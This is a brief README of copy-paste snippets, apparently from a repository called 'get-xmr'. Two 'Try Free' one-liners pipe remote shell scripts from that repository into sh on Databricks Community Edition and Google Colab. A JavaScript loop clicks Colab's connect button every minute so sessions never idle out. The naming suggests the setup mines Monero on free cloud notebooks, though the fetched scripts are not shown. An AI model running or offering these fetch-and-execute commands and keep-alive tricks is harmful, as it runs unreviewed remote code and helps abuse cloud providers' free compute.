# Copy + Paste
* Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
```markdown
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
```
* Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
```markdown
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab.sh | sh
```
* Auto Connect GColab
```markdown
var startClickConnect = function startClickConnect(){ var clickConnect = function clickConnect(){ console.log("Connnect Clicked - Start"); document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click(); console.log("Connnect Clicked - End"); }; var intervalId = setInterval(clickConnect, 60000); var stopClickConnectHandler = function stopClickConnect() { console.log("Connnect Clicked Stopped - Start"); clearInterval(intervalId); console.log("Connnect Clicked Stopped - End"); }; return stopClickConnectHandler; }; var stopClickConnect = startClickConnect();
```
